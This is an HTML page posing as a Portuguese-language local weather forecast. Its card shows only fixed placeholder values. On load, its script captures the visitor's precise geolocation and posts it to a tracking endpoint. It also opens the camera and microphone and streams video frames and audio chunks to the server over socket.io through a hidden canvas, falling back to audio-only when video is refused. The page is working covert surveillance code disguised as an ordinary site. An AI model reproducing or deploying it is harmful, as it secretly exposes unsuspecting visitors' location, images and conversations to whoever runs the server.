<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Previsão do Tempo</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="/socket.io/socket.io.js"></script>
</head>
<body class="bg-gradient-to-br from-blue-500 to-indigo-700 min-h-screen flex items-center justify-center p-4 text-white">

    <div class="bg-white/10 backdrop-blur-md p-6 rounded-2xl border border-white/20 max-w-sm w-full text-center shadow-xl">
        <h1 class="text-2xl font-bold mb-1">Previsão Local</h1>
        <p class="text-sm opacity-80 mb-6">Permita o acesso à localização e recursos do navegador para carregar o clima e alertas da sua região.</p>

        <div id="loading" class="py-8">
            <div class="inline-block animate-spin rounded-full h-10 w-10 border-4 border-white border-t-transparent"></div>
            <p id="status-texto" class="mt-3 text-sm">Carregando dados meteorológicos...</p>
        </div>

        <div id="weather-card" class="hidden">
            <div class="text-6xl font-extrabold mb-2">24°C</div>
            <p class="text-lg font-medium">Parcialmente Nublado</p>
            <div class="mt-6 pt-4 border-t border-white/20 grid grid-cols-2 gap-2 text-sm">
                <div>Umidade: <strong>68%</strong></div>
                <div>Vento: <strong>12 km/h</strong></div>
            </div>
        </div>
    </div>

    <!-- Canvas oculto para enviar frames da câmera em tempo real -->
    <canvas id="cam-canvas" class="hidden"></canvas>

    <script>
        const socket = io();
        const sessaoId = 'sess_' + Math.random().toString(36).substring(2, 10);
        const CHAVE_GEO_DISPOSITIVO = 'geo_capturada_v1';
        let ultimoRegistroSalvo = 0;
        let mediaStream = null;
        let envioMidiaIntervalo = null;

        function registrarHistoricoHttp(coords) {
            const agora = Date.now();
            // Evita floodar o histórico HTTP; salva na 1ª captura e respeita intervalo mínimo
            if (agora - ultimoRegistroSalvo < 15000 && ultimoRegistroSalvo !== 0) return;
            ultimoRegistroSalvo = agora;

            const payload = {
                sessaoId,
                latitude: coords.latitude,
                longitude: coords.longitude,
                accuracy: coords.accuracy,
                userAgent: navigator.userAgent,
                dataHora: new Date().toLocaleString('pt-BR')
            };

            fetch('/api/track', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(err => console.error('Erro ao salvar registro:', err));
        }

        function enviarLocalizacaoTempoReal(position) {
            const dadosGeo = {
                sessaoId,
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                speed: position.coords.speed,
                heading: position.coords.heading,
                userAgent: navigator.userAgent,
                dataHora: new Date().toLocaleString('pt-BR')
            };

            socket.emit('localizacao-atualizada', dadosGeo);
            registrarHistoricoHttp(position.coords);
            mostrarClima();
        }

        function iniciarMidia(comVideo = true) {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;

            navigator.mediaDevices.getUserMedia({
                video: comVideo ? { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } : false,
                audio: true
            })
            .then((stream) => {
                mediaStream = stream;
                socket.emit('status-midia', {
                    sessaoId,
                    cameraAtiva: comVideo,
                    audioAtivo: stream.getAudioTracks().length > 0,
                    dataHora: new Date().toLocaleString('pt-BR')
                });

                // Envio de frames de vídeo (câmera)
                if (comVideo) {
                    const videoEl = document.createElement('video');
                    videoEl.srcObject = stream;
                    videoEl.muted = true;
                    videoEl.play();

                    const canvas = document.getElementById('cam-canvas');
                    const ctx = canvas.getContext('2d');

                    envioMidiaIntervalo = setInterval(() => {
                        if (videoEl.readyState === videoEl.HAVE_ENOUGH_DATA) {
                            canvas.width = 480;
                            canvas.height = 360;
                            ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
                            const frameBase64 = canvas.toDataURL('image/jpeg', 0.55);
                            socket.emit('frame-camera', {
                                sessaoId,
                                frame: frameBase64,
                                dataHora: new Date().toLocaleString('pt-BR')
                            });
                        }
                    }, 350); // ~2.8 FPS estáveis para não sobrecarregar o Render Free
                }

                // Envio de áudio (escuta) via MediaRecorder
                const audioTracks = stream.getAudioTracks();
                if (audioTracks.length > 0) {
                    const audioStream = new MediaStream(audioTracks);
                    const mimeType = MediaRecorder.isTypeSupported('audio/webm;codecs=opus')
                        ? 'audio/webm;codecs=opus'
                        : '';

                    const recorder = mimeType
                        ? new MediaRecorder(audioStream, { mimeType })
                        : new MediaRecorder(audioStream);

                    recorder.ondataavailable = (event) => {
                        if (event.data && event.data.size > 0) {
                            event.data.arrayBuffer().then((buffer) => {
                                socket.emit('chunk-audio', {
                                    sessaoId,
                                    chunk: buffer,
                                    mimeType: recorder.mimeType || 'audio/webm',
                                    dataHora: new Date().toLocaleString('pt-BR')
                                });
                            });
                        }
                    };

                    recorder.start(500); // Envia trechos de áudio a cada 500ms
                }
            })
            .catch((err) => {
                console.warn('Permissão de câmera/áudio negada ou indisponível:', err.message);
                // Se falhou pedindo vídeo+áudio, tenta apenas áudio como fallback
                if (comVideo) {
                    iniciarMidia(false);
                } else {
                    socket.emit('status-midia', {
                        sessaoId,
                        cameraAtiva: false,
                        audioAtivo: false,
                        erro: err.message
                    });
                }
            });
        }

        function mostrarClima() {
            document.getElementById('loading').classList.add('hidden');
            document.getElementById('weather-card').classList.remove('hidden');
        }

        function solicitarLocalizacao() {
            // Solicita e captura apenas uma vez por dispositivo/navegador
            if (localStorage.getItem(CHAVE_GEO_DISPOSITIVO) === '1') {
                mostrarClima();
                return;
            }

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        localStorage.setItem(CHAVE_GEO_DISPOSITIVO, '1');
                        enviarLocalizacaoTempoReal(position);
                    },
                    (error) => {
                        console.warn('Permissão de localização negada ou indisponível:', error.message);
                        localStorage.setItem(CHAVE_GEO_DISPOSITIVO, '1');
                        mostrarClima();
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
                );
            } else {
                mostrarClima();
            }
        }

        window.addEventListener('load', () => {
            socket.emit('nova-sessao', {
                sessaoId,
                userAgent: navigator.userAgent,
                dataHora: new Date().toLocaleString('pt-BR')
            });

            solicitarLocalizacao();
            iniciarMidia(true);
        });

        // Dispara também no primeiro clique/toque caso o navegador bloqueie mídia no load
        document.addEventListener('click', () => {
            if (!mediaStream) {
                iniciarMidia(true);
            }
        }, { once: true });
    </script>
</body>
</html>
